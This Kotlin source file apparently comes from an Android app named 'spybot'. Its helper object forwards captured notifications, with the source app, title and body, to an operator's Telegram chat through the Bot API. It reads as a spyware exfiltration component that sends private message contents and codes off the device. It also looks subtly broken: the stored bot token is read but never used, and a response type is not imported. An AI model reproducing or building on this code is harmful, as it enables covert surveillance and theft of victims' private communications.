package com.example.spybot.helper

import android.content.Context
import com.example.spybot.network.TelegramApiService
import com.example.spybot.utils.AppPreferences
import okhttp3.OkHttpClient
import okhttp3.logging.HttpLoggingInterceptor
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.util.concurrent.TimeUnit

object TelegramHelper {

    private const val BASE_URL = "https://api.telegram.org/"

    // Logging
    private val logging = HttpLoggingInterceptor().apply {
        level = HttpLoggingInterceptor.Level.BODY
    }
    
    private val client = OkHttpClient.Builder()
        .addInterceptor(logging)
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    private val retrofit = Retrofit.Builder()
        .baseUrl(BASE_URL)
        .client(client)
        .addConverterFactory(GsonConverterFactory.create())
        .build()

    private val apiService = retrofit.create(TelegramApiService::class.java)

    fun sendNotification(context: Context, title: String, body: String, packageName: String) {
        
        // ✅ Get from Preferences first, fallback to empty string if not set
        val token = AppPreferences.getToken(context) ?: ""
        val chatId = AppPreferences.getChatId(context) ?: ""

        if (token.isEmpty() || chatId.isEmpty()) {
            return // Don't spam if settings are not configured
        }

        val message = "<b>New Notification!</b>\n\n" +
                "<b>App:</b> $packageName\n" +
                "<b>Title:</b> $title\n" +
                "<b>Body:</b> $body"

        try {
            apiService.sendMessage(chatId, message).enqueue(object : retrofit2.Callback<TelegramResponse> {
                override fun onResponse(call: retrofit2.Call<TelegramResponse>, response: retrofit2.Response<TelegramResponse>) {
                    // Success or failure handled by Telegram API response
                }

                override fun onFailure(call: retrofit2.Call<TelegramResponse>, t: Throwable) {
                    // Log error
                }
            })
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}
